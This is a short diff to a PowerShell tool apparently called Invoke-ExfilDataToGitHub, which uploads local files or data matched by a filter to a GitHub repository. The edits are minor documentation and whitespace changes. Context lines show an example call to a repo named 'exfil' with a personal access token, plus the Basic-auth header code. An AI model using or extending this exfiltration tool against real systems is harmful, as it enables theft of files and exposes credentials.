@@ -30,8 +30,7 @@ Local file path of files to upload
 GitHub filename eg. testfile.txt
 
 .PARAMETER Filter
-Local file filter eg. '*.*' to get all files, '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory. 
-Defaults'
+Local file filter eg. '*.*' to get all files (default), '*.pdf' for all pdfs, or 'file.txt, file2.docx' to get a comma-delimited list of files from that dirctory. 
 
 .PARAMETER Data
 Data to write to file
@@ -110,6 +109,7 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
 
     # Convert this to Base64
     $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
+    
     $Headers = @{
         Authorization =  'Basic {0}' -f $Base64Token;
     };
@@ -202,7 +202,6 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
 
 
     # Get the collection of files from the filter
-    #if ($Files) { $Files.Clear() }
     $Files = @()
 
     $Filters = $Filter.Split(',')
